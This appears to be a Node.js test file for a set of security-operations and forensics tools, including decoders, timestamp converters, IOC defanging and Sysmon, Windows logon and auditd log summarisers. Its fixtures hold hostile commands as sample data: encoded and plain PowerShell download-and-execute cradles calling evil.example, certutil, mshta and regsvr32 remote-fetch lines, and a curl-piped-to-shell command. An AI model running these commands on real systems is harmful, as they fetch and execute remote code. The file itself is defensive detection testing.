// Batch 2 (SOC/DFIR tools). Ground truth: Python (base64, datetime, ipaddress, urllib), the `file` command and
// real files generated locally, plus hand-built Sysmon/Security/auditd records following the documented schemas.
import test from 'node:test';
import assert from 'node:assert/strict';
import { readFile } from 'node:fs/promises';
import vm from 'node:vm';
import { webcrypto } from 'node:crypto';
import { TextDecoder } from 'node:util';

const source = await readFile(new URL('../assets/platform.js', import.meta.url), 'utf8');
const a = source.indexOf('let tools=') + 'let tools='.length;
const b = source.indexOf('\n];\nfunction rows', a);
const hs = source.indexOf('function rows('), he = source.indexOf('const grid=', hs);
const makeCtx = (now) => ({ crypto: webcrypto, TextEncoder, TextDecoder, Uint8Array, atob, btoa, URL,
  Date: now ? class extends Date { constructor(...x) { super(...(x.length ? x : [now])); } static now() { return now; } } : Date,
  Math, JSON, BigInt, Number, String, Array, Object, RegExp, Error, Set, Map, Intl, encodeURIComponent, decodeURIComponent,
  parseInt, parseFloat, isNaN, performance, Promise, AbortController, setTimeout, clearTimeout });
const load = (now) => vm.runInNewContext(`(()=>{${source.slice(hs, he)}\nconst r=${source.slice(a, b + 2)};r.forEach(withValidatedInputs);return r;})()`, makeCtx(now));
const tools = load();
const mk = (list) => (id, v = {}) => { const t = list.find(x => x.id === id); assert.ok(t, 'unknown tool ' + id);
  const values = {}; for (const f of t.fields) values[f[0]] = f[2]; return t.run({ ...values, ...v }); };
const run = mk(tools);
const FX = {"ps_enc": "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGUAeABhAG0AcABsAGUALwBhAC4AcABzADEAJwApAA==", "ps_plain": "RwBlAHQALQBEAGEAdABlAA==", "unix": 1795248000, "filetime": 134397216000000000, "webkit": 13439721600000000, "cocoa": 816940800, "ticks": 639308448000000000, "iso": "2026-11-21T08:00:00Z", "files": {"png": {"hex": "89504e470d0a1a0a0000000d4948445200000001000000010802000000907753", "file": "PNG image data, 1 x 1, 8-bit/color RGB, non-interlaced"}, "pdf": {"hex": "255044462d312e370a312030206f626a0a3c3c3e3e0a656e646f626a0a747261", "file": "PDF document, version 1.7"}, "zip": {"hex": "504b0304140000000000e09c755dac2a93d8020000000200000005000000612e", "file": "Zip archive data, at least v2.0 to extract, compression meth"}, "gzip": {"hex": "1f8b080034d7016b02ffcb48cdc9c95728cf2fca49c9c0ca0400ac49b5962100", "file": "gzip compressed data, last modified: Sat Nov 21 17:39:00 202"}, "bz2": {"hex": "425a68393141592653594eec4ac90000059180400006449080200022bfd52368", "file": "bzip2 compressed data, block size = 900k"}, "xz": {"hex": "fd377a585a000004e6d6b4460200210116000000742fe5a3e0002000115d0034", "file": "XZ compressed data, checksum CRC64"}, "sqlite": {"hex": "53514c69746520666f726d617420330010000101004020200000000100000002", "file": "SQLite 3.x database, last written using SQLite version 30530"}, "elf": {"hex": "7f454c4602010100000000000000000003003e0001000000306d000000000000", "file": "ELF 64-bit LSB shared object, x86-64, version 1 (SYSV)"}, "pcap": {"hex": "d4c3b2a1020004000000000000000000ffff000001000000", "file": "pcap capture file, microsecond ts (little-endian) - version "}, "gif": {"hex": "47494638396101000100800000000000ffffff21f90401000000002c00000000", "file": "GIF image data, version 89a, 1 x 1"}, "jpeg": {"hex": "ffd8ffe000104a46494600010100000100010000ffd9", "file": "JPEG image data, JFIF standard 1.01, aspect ratio, density 1"}, "script": {"hex": "23212f62696e2f626173680a6563686f2068690a", "file": "Bourne-Again shell script, ASCII text executable"}, "wav": {"hex": "524946462400000057415645666d7420100000000100010044ac000088580100", "file": "RIFF (little-endian) data, WAVE audio, Microsoft PCM, 16 bit"}}, "cidr": {"ips": ["10.1.2.3", "10.255.255.255", "11.0.0.0", "192.168.5.9", "192.169.0.1", "198.51.100.77", "198.51.100.128", "0.0.0.0", "255.255.255.255", "2001:db8::1", "2001:db8:ffff::", "2001:db9::", "::1", "::", "fe80::1", "2001:0db8:0000:0000:0000:0000:0000:0001", "10.0.0.1"], "nets": ["10.0.0.0/8", "192.168.0.0/16", "198.51.100.64/26", "0.0.0.0/32", "2001:db8::/32", "::1/128", "fe80::/10", "255.255.255.255"], "exp": {"10.1.2.3": ["10.0.0.0/8"], "10.255.255.255": ["10.0.0.0/8"], "11.0.0.0": [], "192.168.5.9": ["192.168.0.0/16"], "192.169.0.1": [], "198.51.100.77": ["198.51.100.64/26"], "198.51.100.128": [], "0.0.0.0": ["0.0.0.0/32"], "255.255.255.255": ["255.255.255.255"], "2001:db8::1": ["2001:db8::/32"], "2001:db8:ffff::": ["2001:db8::/32"], "2001:db9::": [], "::1": ["::1/128"], "::": [], "fe80::1": ["fe80::/10"], "2001:0db8:0000:0000:0000:0000:0000:0001": ["2001:db8::/32"], "10.0.0.1": ["10.0.0.0/8"]}}, "layer_b64_hex_url": "NzA2Zjc3NjU3MjczNjg2NTZjNmMyNTMyMzAyZDZlNmY3MDI1MzIzMDJkNjMyNTMyMzAyNTMyMzI2OTY1NzgyNTMyMzg2OTc3NzIyNTMyMzA2ODc0NzQ3MDI1MzM0MTI1MzI0NjI1MzI0NjY1NzY2OTZjMmU2NTc4NjE2ZDcwNmM2NTI1MzI0NjcwMjUzMjM5MjUzMjMy", "layer_text": "powershell -nop -c \"iex(iwr http://evil.example/p)\"", "layer_url": "powershell%20-nop%20-c%20%22iex%28iwr%20http%3A%2F%2Fevil.example%2Fp%29%22", "aud_hex": "2F746D702F782079"};
const SIG = { png: /PNG image/, pdf: /PDF document/, zip: /ZIP container/, gzip: /gzip/, bz2: /bzip2/, xz: /xz compressed/, sqlite: /SQLite 3/,
  elf: /ELF executable/, pcap: /PCAP capture \(little endian\)/, gif: /GIF image \(89a\)/, jpeg: /JPEG image/, script: /shebang/, wav: /RIFF container.*WAV audio|WAV audio/ };
const ev = (id, data) => `<Event><System><EventID>${id}</EventID></System><EventData>${Object.entries(data).map(([k, v]) => `<Data Name="${k}">${v}</Data>`).join('')}</EventData></Event>`;

test('powershell-encoded-decoder matches Python UTF-16LE Base64 and flags indicators', async () => {
  const o = run('powershell-encoded-decoder', { text: 'powershell.exe -NoP -W Hidden -EncodedCommand ' + FX.ps_enc });
  assert.match(o, /Decoded \(\d+ characters\):\nIEX \(New-Object Net\.WebClient\)\.DownloadString\('http:\/\/evil\.example\/a\.ps1'\)/);
  assert.match(o, /Invoke-Expression/); assert.match(o, /Download capability/); assert.match(o, /hxxp:\/\/evil\[\.\]example\/a\[\.\]ps1/);
  const plain = run('powershell-encoded-decoder', { text: FX.ps_plain });
  assert.match(plain, /^Decoded \(8 characters\):\nGet-Date/); assert.match(plain, /Indicators:\n  none/);
  assert.throws(() => run('powershell-encoded-decoder', { text: 'not base64 !!' }), /No valid Base64/);
  assert.throws(() => run('powershell-encoded-decoder', { text: 'QUJD' }), /odd length/);
});

test('forensic-timestamps matches Python datetime for every epoch format', () => {
  const d = '2026-11-21T08:00:00.000Z';
  for (const [v, label] of [[FX.unix, 'Unix seconds'], [FX.unix * 1000, 'Unix milliseconds'], [FX.unix * 1000000, 'Unix microseconds']])
    assert.match(run('forensic-timestamps', { value: String(v) }), new RegExp(label + ': ' + d.replace(/\./g, '\\.') + '  \\[plausible\\]'));
  assert.match(run('forensic-timestamps', { value: String(FX.filetime) }), new RegExp('Windows FILETIME: ' + d.replace(/\./g, '\\.')));
  assert.match(run('forensic-timestamps', { value: String(FX.webkit) }), new RegExp('WebKit/Chrome: ' + d.replace(/\./g, '\\.')));
  assert.match(run('forensic-timestamps', { value: String(FX.cocoa) }), new RegExp('macOS absolute \\(s since 2001\\): ' + d.replace(/\./g, '\\.')));
  assert.match(run('forensic-timestamps', { value: String(FX.ticks) }), new RegExp('\\.NET ticks: ' + d.replace(/\./g, '\\.')));
  const back = run('forensic-timestamps', { value: FX.iso, mode: 'ISO date to all formats' });
  for (const [k, v] of [['Unix seconds', FX.unix], ['Unix milliseconds', FX.unix * 1000], ['Windows FILETIME \\(100 ns since 1601\\)', FX.filetime],
    ['WebKit/Chrome \\(us since 1601\\)', FX.webkit], ['macOS absolute \\(s since 2001\\)', FX.cocoa], ['\\.NET ticks \\(100 ns since 0001\\)', FX.ticks]])
    assert.match(back, new RegExp(k + ': ' + String(v) + '(\\n|$)'));
  assert.throws(() => run('forensic-timestamps', { value: '12ab' }), /integer/);
  assert.throws(() => run('forensic-timestamps', { value: 'nope', mode: 'ISO date to all formats' }), /ISO date/);
});

test('ip-in-cidr-list agrees with Python ipaddress for IPv4 and IPv6', () => {
  const o = run('ip-in-cidr-list', { ips: FX.cidr.ips.join('\n'), cidrs: FX.cidr.nets.join('\n') });
  for (const ip of FX.cidr.ips) {
    const want = FX.cidr.exp[ip];
    const line = o.split('\n').find(l => l.slice(9).split('  ')[0] === ip);
    assert.ok(line, 'missing line for ' + ip);
    if (want.length) { assert.ok(line.startsWith('MATCH'), ip + ' should match'); for (const n of want) assert.ok(line.includes(n), ip + ' should list ' + n); }
    else assert.ok(line.startsWith('no match'), ip + ' should not match');
  }
  assert.throws(() => run('ip-in-cidr-list', { ips: '1.1.1.1', cidrs: '10.0.0.0/33' }), /Invalid CIDR/);
  assert.throws(() => run('ip-in-cidr-list', { ips: '1.1.1.1', cidrs: 'abc' }), /Invalid CIDR/);
  assert.match(run('ip-in-cidr-list', { ips: '999.1.1.1', cidrs: '10.0.0.0/8' }), /INVALID  999\.1\.1\.1/);
});

test('file-signature-id agrees with the file command on real generated files', () => {
  for (const [k, f] of Object.entries(FX.files)) {
    const o = run('file-signature-id', { hex: f.hex });
    assert.match(o, SIG[k], k + ' (file says: ' + f.file + ')');
  }
  assert.match(run('file-signature-id', { hex: '4d 5a 90 00' }), /Executable format: Yes/);
  assert.match(run('file-signature-id', { hex: FX.files.png.hex }), /Executable format: No/);
  assert.match(run('file-signature-id', { hex: '00112233' }), /Unknown/);
  assert.throws(() => run('file-signature-id', { hex: '4d' }), /at least 4 bytes/);
  assert.throws(() => run('file-signature-id', { hex: 'zzzzzzzz' }), /at least 4 bytes/);
});

test('ioc-defang defangs and refangs losslessly', () => {
  const src = 'Beacon to https://evil-cdn.example.com/a.php from 203.0.113.9, contact bad@mail.example.org or visit download.badsite.ru.';
  const d = run('ioc-defang', { text: src });
  assert.equal(d, 'Beacon to hxxps[:]//evil-cdn[.]example[.]com/a[.]php from 203[.]0[.]113[.]9, contact bad[@]mail[.]example[.]org or visit download[.]badsite[.]ru.');
  assert.equal(run('ioc-defang', { text: d, mode: 'Refang' }), src);
  assert.equal(run('ioc-defang', { text: 'see report.pdf and v1.2 notes.' }), 'see report.pdf and v1.2 notes.');
  assert.equal(run('ioc-defang', { text: 'ftp://files.example.net/x', mode: 'Defang' }), 'fxp[:]//files[.]example[.]net/x');
  assert.equal(run('ioc-defang', { text: 'hxxp://a(.)com and b(at)c(dot)org', mode: 'Refang' }), 'http://a.com and b@c.org');
});

test('layered-decoder unwraps Base64 -> hex -> URL layers built independently in Python', () => {
  const o = run('layered-decoder', { text: FX.layer_b64_hex_url });
  assert.match(o, /Layer 1 \(base64\)/); assert.match(o, /Layer 2 \(hex\)/); assert.match(o, /Layer 3 \(url\)/);
  assert.ok(o.endsWith('Final output after 3 layer(s):\n' + FX.layer_text));
  assert.ok(run('layered-decoder', { text: FX.layer_url }).endsWith('Final output after 1 layer(s):\n' + FX.layer_text));
  assert.ok(run('layered-decoder', { text: FX.layer_b64_hex_url, maxLayers: '1' }).includes('Final output after 1 layer(s)'));
  assert.throws(() => run('layered-decoder', { text: 'plain readable text' }), /No decodable layer/);
  assert.throws(() => run('layered-decoder', { text: '   ' }), /Paste the encoded text/);
});

test('sysmon-event-summary flags the documented attack patterns and ignores benign events', () => {
  const o = run('sysmon-event-summary');
  assert.match(o, /Events: 4/); assert.match(o, /HIGH .*encoded PowerShell command/); assert.match(o, /HIGH .*Office spawned powershell\.exe \(parent WINWORD\.EXE\)/);
  assert.match(o, /HIGH .*process access to lsass\.exe by .*x\.exe \(GrantedAccess 0x1010\)/); assert.match(o, /REVIEW .*connection to port 4444 \(203\.0\.113\.5\)/); assert.match(o, /REVIEW .*Run-key persistence/);
  const benign = [ev(1, { UtcTime: 't1', Image: 'C:\\Windows\\System32\\notepad.exe', CommandLine: 'notepad.exe a.txt', ParentImage: 'C:\\Windows\\explorer.exe' }),
    ev(10, { UtcTime: 't2', SourceImage: 'C:\\Windows\\System32\\svchost.exe', TargetImage: 'C:\\Windows\\System32\\lsass.exe', GrantedAccess: '0x0400' }),
    ev(3, { UtcTime: 't3', Image: 'C:\\Program Files\\App\\app.exe', DestinationIp: '203.0.113.5', DestinationPort: '443' })].join('\n');
  const b = run('sysmon-event-summary', { xml: benign });
  assert.match(b, /REVIEW t2 process access to lsass\.exe/); assert.doesNotMatch(b, /HIGH/); assert.doesNotMatch(b, /\\bt1\\b|\\bt3\\b/);
  const lol = run('sysmon-event-summary', { xml: [ev(1, { UtcTime: 'a', Image: 'C:\\Windows\\System32\\certutil.exe', CommandLine: 'certutil -urlcache -f http://x/y.exe y.exe' }),
    ev(1, { UtcTime: 'b', Image: 'C:\\Windows\\System32\\mshta.exe', CommandLine: 'mshta http://x/a.hta' }),
    ev(1, { UtcTime: 'c', Image: 'r.exe', CommandLine: 'regsvr32 /s /n /u /i:http://x/a.sct scrobj.dll' }), ev(8, { UtcTime: 'd', SourceImage: 'a.exe', TargetImage: 'b.exe' })].join('') });
  assert.match(lol, /certutil download/); assert.match(lol, /mshta remote/); assert.match(lol, /regsvr32 scriptlet/); assert.match(lol, /MEDIUM d CreateRemoteThread/);
  assert.throws(() => run('sysmon-event-summary', { xml: 'nothing' }), /No <Event>/);
});

test('windows-logon-summary detects brute force, spraying, success-after-failure and log clearing', () => {
  const o = run('windows-logon-summary');
  assert.match(o, /Failed logons \(4625\): 5/); assert.match(o, /Successful logons \(4624\): 2/); assert.match(o, /5  198\.51\.100\.20/);
  assert.match(o, /HIGH Security audit log was cleared/); assert.match(o, /HIGH 198\.51\.100\.20 has 5 failed logons \(threshold 5\)/);
  assert.match(o, /password-spraying pattern/); assert.match(o, /successful logon after 5 failures: admin type 10 \(RemoteInteractive \(RDP\)\)/); assert.match(o, /REVIEW User account created: temp\$user/);
  const few = run('windows-logon-summary', { xml: [ev(4625, { TargetUserName: 'a', IpAddress: '203.0.113.1' }), ev(4624, { TargetUserName: 'a', LogonType: '2', IpAddress: '-' })].join('') });
  assert.match(few, /No findings/);
  assert.match(run('windows-logon-summary', { xml: Array(3).fill(ev(4625, { TargetUserName: 'a', IpAddress: '203.0.113.1' })).join('') + ev(4624, { TargetUserName: 'a', LogonType: '3', IpAddress: '203.0.113.1' }), threshold: '10' }), /successful logon after 3 failures/);
  assert.throws(() => run('windows-logon-summary', { xml: 'x' }), /No <Event>/);
});

test('auditd-execve-summary rebuilds commands (including hex-encoded args) and flags attack patterns', () => {
  const o = run('auditd-execve-summary');
  assert.match(o, /Commands rebuilt: 4/); assert.match(o, /\[501\] 2025-11-21T08:00:00\.101Z auid=1000  bash -c curl -s http:\/\/203\.0\.113\.9\/x\.sh \| sh/);
  assert.match(o, /HIGH \[501\] download piped into an interpreter/); assert.match(o, /HIGH \[502\] reverse-shell pattern/); assert.match(o, /MEDIUM \[503\] executable\/world-writable file in a temp directory/);
  assert.doesNotMatch(o, /\[504\] .*(HIGH|MEDIUM)/); assert.doesNotMatch(o, /HIGH \[504\]|MEDIUM \[504\]/);
  const hex = run('auditd-execve-summary', { text: 'type=EXECVE msg=audit(1795248000.000:9): argc=2 a0="cat" a1=' + FX.aud_hex });
  assert.match(hex, /\[9\] 2026-11-21T08:00:00Z {2}cat \/tmp\/x y/);
  assert.match(run('auditd-execve-summary', { text: 'type=EXECVE msg=audit(1795248000.000:10): argc=2 a0="/tmp/dropper" a1="-x"' }), /MEDIUM \[10\] binary executed from a temp directory/);
  assert.throws(() => run('auditd-execve-summary', { text: 'garbage' }), /No EXECVE/);
});
